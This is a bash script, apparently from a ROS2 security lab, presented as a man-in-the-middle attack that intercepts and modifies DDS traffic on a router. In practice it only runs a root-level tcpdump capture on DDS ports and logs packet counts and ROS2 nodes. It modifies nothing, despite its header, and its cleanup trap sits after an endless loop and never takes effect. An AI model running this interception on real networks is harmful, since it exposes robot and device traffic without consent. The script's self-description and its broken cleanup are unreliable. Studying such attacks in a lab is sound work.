#!/bin/bash
# Intercept and modify DDS traffic (MITM attack)
# This script runs on the MITM router machine

echo "=========================================="
echo "MITM Traffic Interception and Modification"
echo "=========================================="
echo ""

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "❌ This script requires root privileges"
    echo "   Run with: sudo $0"
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MITM_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
CONFIG_DIR="$MITM_DIR/config"
RESULTS_DIR="$MITM_DIR/results"
mkdir -p "$RESULTS_DIR"

# Load router config
if [ -f "$CONFIG_DIR/mitm_router_config.txt" ]; then
    source "$CONFIG_DIR/mitm_router_config.txt"
else
    echo "❌ MITM router not configured"
    echo "   Run setup_mitm_router.sh first"
    exit 1
fi

echo "This script intercepts and modifies DDS traffic."
echo ""
echo "⚠️  WARNING: This modifies network traffic!"
echo ""

read -p "Continue? [y/N]: " confirm
if [ "$confirm" != "y" ]; then
    echo "Attack cancelled"
    exit 0
fi

echo ""
echo "Step 1: Starting packet capture..."
echo ""

CAPTURE_FILE="$RESULTS_DIR/mitm_capture_$(date +%Y%m%d_%H%M%S).pcap"
echo "Capturing DDS traffic to: $CAPTURE_FILE"
echo ""

# Start packet capture in background
tcpdump -i "$ROUTER_INTERFACE" -w "$CAPTURE_FILE" \
    'udp portrange 7400-7500 or tcp portrange 7400-7500' \
    2>/dev/null &
CAPTURE_PID=$!

echo "✅ Packet capture started (PID: $CAPTURE_PID)"
echo ""

echo "Step 2: Monitoring traffic..."
echo ""
echo "Traffic is being intercepted and logged."
echo "Press Ctrl+C to stop interception"
echo ""

# Monitor traffic
LOG_FILE="$RESULTS_DIR/mitm_intercept_$(date +%Y%m%d_%H%M%S).log"
echo "Logging to: $LOG_FILE"
echo ""

# Function to log with timestamp
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

log_message "=== MITM Interception Started ==="
log_message "Router IP: $ROUTER_IP"
log_message "Interface: $ROUTER_INTERFACE"
log_message ""

# Monitor for DDS traffic
while true; do
    # Count packets
    PACKET_COUNT=$(tcpdump -r "$CAPTURE_FILE" 2>/dev/null | wc -l)
    
    if [ "$PACKET_COUNT" -gt 0 ]; then
        log_message "Intercepted $PACKET_COUNT packets"
    fi
    
    # Check for ROS2 nodes (if ROS2 is available)
    if command -v ros2 &> /dev/null; then
        if [ -n "$ROS_DISTRO" ] || source /opt/ros/jazzy/setup.bash 2>/dev/null || source /opt/ros/humble/setup.bash 2>/dev/null; then
            NODES=$(ros2 node list 2>/dev/null)
            if [ -n "$NODES" ]; then
                log_message "ROS2 nodes detected: $(echo "$NODES" | wc -l)"
            fi
        fi
    fi
    
    sleep 5
done

# Cleanup on exit
trap "kill $CAPTURE_PID 2>/dev/null; echo ''; echo 'Interception stopped'; echo 'Capture file: $CAPTURE_FILE'; echo 'Log file: $LOG_FILE'; exit 0" INT TERM

